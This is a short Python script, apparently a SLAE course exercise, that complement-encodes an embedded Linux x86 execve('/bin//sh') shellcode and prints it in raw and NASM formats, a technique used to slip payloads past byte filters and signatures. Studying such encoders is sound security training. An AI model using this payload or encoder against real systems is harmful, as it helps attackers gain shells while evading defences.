#!/usr/bin/env python
#
# Script name		: not-encode.py
# Created following	: SLAE
# Description		: complement encoding
#

# python objdump2shellcode.py -d <binary> -f raw -b "\x00\xAA"
buf = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\xcd\x80")

# output stored in here
raw = ""
asm = ""

for i in bytearray(buf):
	# Complement Encoding
	b = ~i
	# normal format
	raw += '\\x'
	raw += '%02x' % (b & 0xff)
	# nasm format
	asm += '0x'
	asm += '%02x,' %(b & 0xff)

print "[>] Shellcode length : %d\n" % len(bytearray(buf))
# Evenly output the shellcode
print "[*] Normal format\n"
split = [raw[x:x+80] for x in range(0,len(raw),80)]
for i in range(len(split)):
        print split[i]
print "\n"
# Evenly output the shellcode
print "[*] Nasm format\n"
split = [asm[x:x+40] for x in range(0,len(asm),40)]
for i in range(len(split)):
        print split[i]
print "\n"

